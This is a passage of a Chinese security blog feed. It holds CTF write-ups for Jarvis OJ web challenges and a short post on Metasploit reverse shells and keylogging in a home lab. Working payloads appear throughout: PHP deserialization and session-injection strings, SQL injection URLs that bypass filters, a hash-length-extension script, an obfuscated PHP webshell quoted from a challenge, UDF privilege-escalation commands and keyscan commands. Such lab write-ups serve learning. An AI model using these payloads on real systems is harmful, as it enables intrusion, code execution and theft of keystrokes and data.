class="token class-name">Shield</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>这里把shield.php序列化得到</p><pre class=" language-php"><code class="language-php">s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"shield.php"</span><span class="token punctuation">;</span></code></pre><p>继续利用上面的漏洞.读取shield.php的源码,我这里用firefox仍然在网页上看不全源码,使用抓包看到源码,其实右键查看源码也可以-.-</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">//flag is in pctf.php</span>    <span class="token keyword">class</span> <span class="token class-name">Shield</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//赋值 {</span>            <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> file <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span>              <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>这里继续判断传入的文件名中是否存在 .. /  以及\ \</p><p>直接利用上面的代码,实例化对象的时候,为期赋值为pctf.php</p><p>得到payload为O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;}</p><p>打进去右键查看源代码就得到flag</p><p><img src="https://i.loli.net/2020/01/03/GWJCcgUQd8mrR7N.png" alt></p><pre><code>PCTF{W3lcome_To_Shi3ld_secret_Ar3a}</code></pre><h1 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h1><ul><li>session反序列化</li><li>任意代码执行</li></ul><p>关于这个点的学习,参考文章 <a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" rel="noopener">参考</a></p><p>Session反序列化的原理: </p><blockquote><p>当php.ini文件中的“session.serialize_handler”设置，与在页面中的“session.serialize_handler”设置不一样时，就会可能有反序列化漏洞。</p><p>由phpinfo()页面知，session.upload_progress.enabled为On。当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name<strong>同名</strong>变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session.</p><p><img src="https://i.loli.net/2020/01/03/GdJifUreICkzO5B.png" alt></p></blockquote><p>题目给出了源码</p><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//A webshell is wait for you</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">OowoO</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mdzz</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//为成员属性mdzz赋初值为phpinfo();</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mdzz</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//反序列化结束的时候利用eval执行其中的代码</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'phpinfo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//设置GET的变量名为phpnifo</span><span class="token punctuation">{</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//如果确认设置了phpinfo,那么就实例化这个类,并赋值给m</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>访问index.php?phpinfo 得到phpinfo的界面,搜索disable_functions</p><p>禁用的系统函数有: 因此想利用命令执行是走不通的</p><table><thead><tr><th align="left">dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,chmod,set_time_limit,chroot,error_log,pfsockopen,syslog,symlink,putenv,chgrp,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority等</th></tr></thead><tbody><tr><td align="left"></td></tr></tbody></table><p> <strong>php</strong> 在获取 <strong>session</strong> 的时候，会按照 <strong>session.serialize_handler=php</strong> 规则来处理 <strong>session</strong> 文件，<strong>将 | 符号之前的所有内容认为是键名，之后的内容则用于反序列化。</strong></p><pre><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;}</code></pre><p>为了防止转义,需要在引号前加反斜杠\ </p><p>然后在payload前加一个| </p><p>这是session的格式</p><p><img src="https://i.loli.net/2020/01/03/7JqWUGynZTCp1gL.png" alt></p><p>接下来就是读取这个文件</p><pre><code>Here_1s_7he_fl4g_buT_You_Cannot_see.php</code></pre><pre><code>/opt/lampp/htdocs/</code></pre><p>在phpinfo中找到文件存放的路径</p><p><img src="https://i.loli.net/2020/01/03/ABLgnjhaouYZmCQ.png" alt></p><p><img src="https://i.loli.net/2020/01/03/4fTs8PQ9ijlZ5VJ.png" alt></p><pre><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}</code></pre><p><img src="https://i.loli.net/2020/01/03/Eb9PIlhTSjnFQM1.png" alt></p><p>总结:</p><ul><li>对于session反序列化的原理要理解.</li><li>以及防止转义的原理.</li><li>构造文件上传的那个HTML写法</li></ul><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB?"></a>WEB?</h1><ul><li>代码还原</li><li>解方程 <a href="http://www.yunsuan.info/matrixcomputations/solvematrixmultiplication.html?referer=www.yunsuanzi.com" target="_blank" rel="noopener">运算网</a></li></ul><p>打开题目.在Google中只能找到app.js是作者写的</p><p>打开后用sublime test 还原 </p><p>因为这个页面没有form表单,所以这个app.js中必有实现POST请求的代码,找到代码所在的位置,继续跟进解密</p><p>总结: </p><p>关于这类题,我的解题能力还是比较弱的-.-</p><h1 id="RE"><a href="#RE" class="headerlink" title="RE?"></a>RE?</h1><p>参考文章: </p><p><a href="https://blog.csdn.net/albertsh/article/details/78567661" target="_blank" rel="noopener">mysql函数扩展之UDF开发</a></p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/adding-udf.html" target="_blank" rel="noopener">Adding a User-Defined Function</a></p><p><a href="https://www.cnblogs.com/sijidou/p/10522972.html" target="_blank" rel="noopener">UDF提权</a></p><p>查看mysql插件的目录</p><p>/usr/lib/x86_64-linux-gnu/mariadb19/plugin/</p><p><img src="https://i.loli.net/2020/01/03/lm72XZ4x9OdVWw6.png" alt></p><p>然后将题目所给的附件下载到这个目录里面</p><pre><code>usr/lib/x86_64-linux-gnu/mariadb19/plugin# wget https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</code></pre><p><img src="https://i.loli.net/2020/01/03/b2j6tGysTOp3hmM.png" alt></p><p>登录mysql后,加载getflag函数即可得到flag.但是必须先加载help_me函数</p><p>create function getflag returns string soname ‘udf.so.02f8981200697e5eeb661e64797fc172’;</p><p><img src="https://i.loli.net/2020/01/03/mO5GQFz9Io3kbqx.png" alt></p><p>总结:</p><blockquote><p>UDF就是Userdefined function,是用户自定义函数,</p><p>UDF就是为了让我们user能够写方便自己的函数,有3种返回值,这三种分别是STRING,INTEGER,REAL</p><p>定义格式:</p><p>create function function_name returns (strings|integer|real) soname ‘文件名’;</p><p>删除自定义函数: </p><p>drop function function_name;</p></blockquote><h1 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h1><ul><li>eregi()函数存在截断漏洞</li><li>file_get_contents($a,’r’);可以利用PHP伪协议php://input读取文件流(数据流)</li><li>过滤了空格和部分关键字的SQL注入</li></ul><p>右键查看源代码,发现index.phps.打开后得到一部分源码</p><pre class=" language-PHP"><code class="language-PHP"><?phperror_reporting(0);echo "<!--index.phps-->";if(!$_GET['id']){    header('Location: index.php?id=1');    exit();}$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.')){    echo 'Hahahahahaha';    return ;}$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4){    require("flag.txt");}else{    print "work harder!harder!harder!";}?></code></pre><p>payload:</p><p>?id=c&amp;a=php://input&amp;b=%0011111</p><p>POST的内容如下: </p><p>1112 is a nice lab!</p><p>得到</p><p>/^HT2mCpcvOLf</p><p>访问这个目录</p><pre><code>http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=4%27%20union%20select%201,2,3#</code></pre><p>返回 you bad boy/girl! 这里应该是过滤一些字符</p><pre><code>/index.php?id=4&#39;&lt;&gt;union&lt;&gt;select&lt;&gt;1,2,3#</code></pre><p>尝试绕过空格,返回</p><pre class=" language-mysql"><code class="language-mysql">SELECT * FROM content WHERE id=4'<><><>1,2,3</code></pre><p>可以看到,union和select都被过滤了.尝试双写绕过</p><p>双写绕过确实可行,但是&lt;&gt;绕过空格检测在这道题上不能正确执行sql语句,要想执行正确的sql语句必须使用/**/</p><p>用注释取代空格</p><p>判断列数</p><pre><code>http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*123*/ununionion/*123*/seleselectct/*123*/1,2,3#</code></pre><p>返回结果为3,那么那么那么说明在3这个位置存在注入</p><p>把3改为database(),得到数据库名为test</p><pre><code>?id=-1/*123*/ununionion/*123*/seleselectct/*123*/1,2,group_concat(table_name)/*1*/frofromm/*1*/information_schema.tables/*1*/where/*1*/table_schema=0x74657374# 这里也可以直接写database(). 不采用16进制绕过</code></pre><p>继续查表为content,稍微改一点东西</p><p>查表中字段为id,context,title</p><p>查具体的flag</p><pre><code>id=-1/*123*/ununionion/*123*/seleselectct/*123*/1,2,(seleselectct/*123*/context/*123*/frofromm/*13*/content)#</code></pre><p>PCTF{Fin4lly_U_got_i7_C0ngRatulation5}</p><p>总结:</p><p>很好的一道题,当时做到一半以为已经拿到flag的~</p><p>这道题的前半部分是以前做过的,所以很容易.就是没有想到把得到那个{}中的内容当做URL.这个鬼脑洞.</p><p>以及过滤了哪些关键字的测试,如何绕过.都是以后需要深度学习的.(以后===寒假)</p><h1 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h1><ul><li>抓包分析,大概就是把guest改为admin,但是无源码就找不到入口</li><li>目录爆破</li><li>Vim 临时文件恢复</li><li><strong>Hash扩展攻击</strong></li></ul><p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80858080" target="_blank" rel="noopener">参考文章</a></p><p><a href="http://www.freebuf.com/articles/web/69264.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/69264.html</a></p><p><a href="http://www.freebuf.com/articles/web/31756.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/31756.html</a></p><p><img src="https://i.loli.net/2020/01/03/rkIwaty1HMVFbxA.png" alt></p><blockquote><p>扫到index.php~这个文件 这个文件其实是php的备份文件.</p><p>php的备份文件又两种:</p><p>php~ 和 php.bak</p><p>备份文件常见的格式: </p><p>.bak .save .swp ~</p></blockquote><p>将其改为flag.php.swp</p><p><img src="https://i.loli.net/2020/01/03/eXOtadkCbAoH7yP.png" alt></p><p>来分析一波代码,这里如果auth为true那么就输出flag</p><p>为true的条件是什么呢? </p><pre class=" language-PHP"><code class="language-PHP">$role==="admin"&&hsh===md5($salt.strrev($_COOKIE["role"]))</code></pre><p>strrev()函数的作用是反转字符串</p><p>也就是$salt加上反转后的cookie然后进行md5值满足这个hsh但是我们并不知道salt是多少</p><p>hash的原理</p><p>进行两次复杂的数学运算,将第一次运算的结果作为register的值再进行第二次运算</p><p>然后这里我们不知道salt,但是我们知道md5($salt.反转后的cookie)的值</p><p>salt的长度也不知道.需要爆破出salt的长度</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token keyword">import</span> hashpumpy<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://web.jarvisoj.com:32778/"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> hashpumpy<span class="token punctuation">.</span>hashpump<span class="token punctuation">(</span><span class="token string">'3a4727d57463f122833d9e732f94e4e0'</span><span class="token punctuation">,</span><span class="token string">';"tseug":5:s'</span><span class="token punctuation">,</span><span class="token string">';"nimda":5:s'</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"web.jarvisoj.com:32778"</span><span class="token punctuation">,</span><span class="token string">"Cache-Control"</span><span class="token punctuation">:</span> <span class="token string">"max-age=0"</span><span class="token punctuation">,</span><span class="token string">"Upgrade-Insecure-Requests"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"</span><span class="token punctuation">,</span><span class="token string">"Accept"</span><span class="token punctuation">:</span><span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span><span class="token punctuation">,</span><span class="token string">"Accept-Language"</span><span class="token punctuation">:</span><span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span><span class="token string">"Cookie"</span><span class="token punctuation">:</span><span class="token string">"UM_distinctid=1656bc8a44b150-0acd2220410fbd-323b5b03-144000-1656bc8a44c1ff; role=%s; hsh=%s"</span><span class="token operator">%</span><span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#这段内容可用bp抓包[::-1]),result[0]),"Connection":"close"}   #[::-1]取反,这里与strrev对应.%s表示格式化一个对象为字符串</span>    re <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers <span class="token operator">=</span> data<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"Only Admin can see the flag!!"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>因为要逐个爆破,所以脚本运行的时候要等一下才会出flag</p><p>PCTF{H45h_ext3ndeR_i5_easy_to_us3}</p><p>总结: </p><p>理解hash加密算法原理, MD5 SHA1. 理解hash 扩展攻击的原理,以及进行攻击的必要条件(知道hash1,密钥长度)</p><p>可利用场景</p><h1 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h1><ul><li>文件包含</li><li>文件上传</li></ul><p>上传一个png图片</p><p><img src="https://i.loli.net/2020/01/03/52JRSTutnwh9ksQ.png" alt></p><p>尝试传一个.htaccess 也提示只能穿JPG和GIF</p><p>从题目描述中也可以猜到可能会使用两个或多个漏洞来结合</p><p>随便改一个参数index.php?page=sqw</p><pre><code>**Warning**:  fopen(21.php): failed to open stream: No such file or directory in **/opt/lampp/htdocs/index.php** on line **24** No such file!</code></pre><p>说明这里存在文件包含,制作一个图片马.<strong>推荐使用JS方式的图片马.,因为大部分会对PHP格式的进行验证.</strong></p><p>上传后,得到链接为</p><pre><code>http://web.jarvisoj.com:32785/uploads/1577946975.jpg</code></pre><p>然后再去包含这个文件index.php?page=uploads/1577946975.jpg%00</p><p>得到flag</p><p>总结: </p><p>除了文件上传漏洞常用的绕过方式需要知道外,还需要知道文件上传能和那些漏洞结合,比如文件包含.</p><h1 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h1><ul><li>SSRF    <a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">https://xz.aliyun.com/t/2115</a></li></ul><p>点进去一个菜刀-.-管理员登录,查看源码给了IP地址 admin ip is 202.5.19.128</p><p>从图片的加载链接,来看,是存在类似使用代理跳转的这种东西,这个名字也是我自己瞎编的</p><p><a href="http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/" target="_blank" rel="noopener">http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/</a></p><pre><code>YOU&#39;RE CLOOSING!</code></pre><p>扫描目录,有robots.txt(记住这个东西,在CTF题里面太重要了,下次可以不用扫,没进一个新的URL都先看看有没有robots.txt)</p><p>访问trojan.php.txt</p><pre class=" language-PHP"><code class="language-PHP"><?php ${("#"^"|").("#"^"|")}=("!"^"`").("( "^"{").("("^"[").("~"^";").("|"^".").("*"^"~");${("#"^"|").("#"^"|")}(("-"^"H"). ("]"^"+"). ("["^":"). (","^"@"). ("}"^"U"). ("e"^"A"). ("("^"w").("j"^":"). ("i"^"&"). ("#"^"p"). (">"^"j"). ("!"^"z"). ("T"^"g"). ("e"^"S"). ("_"^"o"). ("?"^"b"). ("]"^"t"));?></code></pre><blockquote><p> <strong>Warning</strong>:  assert() [<a href="http://localhost/CTF/function.assert" target="_blank" rel="noopener">function.assert</a>]: Assertion “eval($_POST[360])” failed in <strong>D:\phpStudy\PHPTutorial\WWW\CTF\rf.php</strong> on line <strong>1</strong></p></blockquote><p>在本地运行后,报错,360应该就是这个密码</p><p>然后使用hackbar,POST 一个360过去 就看到了flag 或者 360=system(‘ls’);</p><p>总结:SSRF特征,利用方式,常见bypass后期为专门出的.</p><blockquote><p>1.社交分享功能：获取超链接的标题等内容进行显示</p><p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p><p>3.在线翻译：给网址翻译对应网页的内容</p><p>4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p><p>5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p><p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p><p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p><p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p><p>9.邮件系统：比如接收邮件服务器地址</p><p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p><p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p><p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p><p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p></blockquote><h1 id="图片上传漏洞"><a href="#图片上传漏洞" class="headerlink" title="图片上传漏洞"></a>图片上传漏洞</h1><ul><li><a href="https://www.2cto.com/article/201605/505823.html" target="_blank" rel="noopener">CVE-2016-3714 好牛B的一个洞</a></li></ul><blockquote><p>漏洞原理</p><p>ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用<a href="https://www.2cto.com/os/" target="_blank" rel="noopener">系统</a>的system命令来执行的</p><p>它定义了很多占位符，比如%i是输入的文件名，%l是图片exif  label信息。而在后面command的位置，%i和%l等占位符被拼接在命令行中。这个漏洞也因此而来，被拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号（`）或闭合双引号，来执行任意命令。</p></blockquote><p>只能上传图片.扫描目录存在test.php|login.php|config.php|register.php打开其中的test.php是一个phpinfo界面</p><p>在学了一波CVE分析文章后,还是做不出来这道题,然后看了一大波WP</p><p><a href="https://err0rzz.github.io/2017/09/11/jarvisoj/" target="_blank" rel="noopener">其中这个大佬的WP比较详细</a>,然后他还写了一个常驻内存的脚本,循环删除上传的文件..</p><p><a href="https://nonuplebroken.com/2019/05/11/JarvisOJ-WEB-WP/" target="_blank" rel="noopener">另一个大佬</a></p><p>但是我上传一个正常的png,并没有被删除,能正常访问</p><p><strong>进行两次转义,一次是本地的exiftool命令，一次是漏洞触发时的echo命令</strong></p><p><img src="https://i.loli.net/2020/01/03/POlckomCfK4aW3s.png" alt></p><p>然后上传test.png</p><p>然后修改filetype=show或者win,在重新发包,ImageMagick在收到这张图片时就会转换这张的图片的格式,但是无论改什么,返回都是png文件</p><p>所以我蚁剑就连不上,拿不到flag!</p><p>嫖的flag</p><p>CTF(873dfee87823248f4a1657650204697a}</p><p>总结: </p><ul><li>exiftool工具我也是通过这道题第一次使用,应该以后也会用到!</li><li>转义,为什么转义  参考 <a href="https://www.freebuf.com/column/145182.html" target="_blank" rel="noopener">https://www.freebuf.com/column/145182.html</a></li></ul><blockquote><p>因为代码用了双引号嵌套，双引号里的双引号需要进行转义不然语法错误</p></blockquote><ul><li>写后门的新姿势</li><li><strong>CVE漏洞在CTF中的应用复现</strong></li></ul><h1 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h1><ul><li>bool盲注,如果密码错误就是true,用户名错误就是false</li><li>Python盲注脚本</li><li>SQLmap高级用法</li></ul><p>用户名,密码随便输,提示用户名错误.输入admin,admin提示密码错误,说明采用的是用户名和密码分布验证的</p><p>即先验证用户名再验证密码</p><p>当用户名为 admin’#密码错误,说明’#没有被过滤 当输出 admin’ and 1=1#使,用户名错误,说明过滤了空格或者and</p><pre><code>当输入admin&#39;/*1*/and/*1*/1=1#时,密码错误.说明过滤了空格</code></pre><p>因此使用在网上嫖到的盲注脚本跑就行了-.- SB石锤</p><p>当然也可以使用SQLmap这个强大的工具!</p><p>即 –tamper=space2comment模式可以解决这类问题</p><p><img src="https://i.loli.net/2020/01/03/wnxoZUKuvTCJFhq.png" alt></p><p><img src="https://i.loli.net/2020/01/03/bk6J3WRAv4q29Lr.png" alt></p><p>查密码为 </p><p>334cfb59c9d74849801d5acdcfdaadc3</p><p><a href="https://www.somd5.com/" target="_blank" rel="noopener">在这里解密</a> 为</p><p>eTAloCrEP</p><p>登录进去,得到flag</p><p>CTF{s1mpl3_1nJ3ction_very_easy!!}        </p><p>总结: </p><p>不得不说sqlmap 真的很强大,学会使用他可以方便很多,但是SQLi的原理也是必须掌握的.</p><p>编写sqli的python脚本,也是需要必须掌握的.寒假加油!</p><p>冲!菜狗准备开始深入学习漏洞了,并且保持每天两道攻防世界练习!奥利奥! …奥利给!</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>msf实现远程监听</title>
      <link href="/posts/20200101/"/>
      <url>/posts/20200101/</url>
      
        <content type="html"><![CDATA[<p>msf实现远程监听</p><p> 攻 击 机   </p><p>Kali Linux </p><p>ip 192.168.175.145</p><p> 靶  机</p><p>Windows 10 也就是物理机 2333</p><a id="more"></a><p><a href="https://www.anquanke.com/post/id/164525" target="_blank" rel="noopener">参考文章1</a></p><p><a href="https://www.cnblogs.com/backlion/p/9484949.html" target="_blank" rel="noopener">参考文章2</a></p><p>生成payload</p><p><img src="https://i.loli.net/2020/01/01/aHfwhplADEqgKmU.png" alt></p><p>本地监听</p><p>可以看到,在物理机上运行了re.exe后,成功反弹shell</p><p><img src="https://i.loli.net/2020/01/01/DkncBbEu3RwQtyX.png" alt></p><p>现在就等于拿到shell了.可以执行一些命令了</p><p>如打开记事本</p><p><img src="https://i.loli.net/2020/01/01/Qa6BmoMKkfdvsj4.png" alt></p><p>键盘监听</p><p>keyscan_start 开启键盘记录功能</p><p>keyscan_dump 显示捕捉到的键盘记录信息</p><p>keyscan_stop 停止键盘记录功能</p><p>IFONLY is doing something interesting!</p><p><img src="https://i.loli.net/2020/01/01/kUlQ79RKEmq8bCz.png" alt></p><p>哈哈,只是有点无聊罢了</p><hr><p>哦</p><p>元旦快乐</p><p>新的一年</p><p>加加油!</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HFSEC Writeup</title>
      <link href="/posts/20191229/"/>
      <url>/posts/20191229/</url>
      
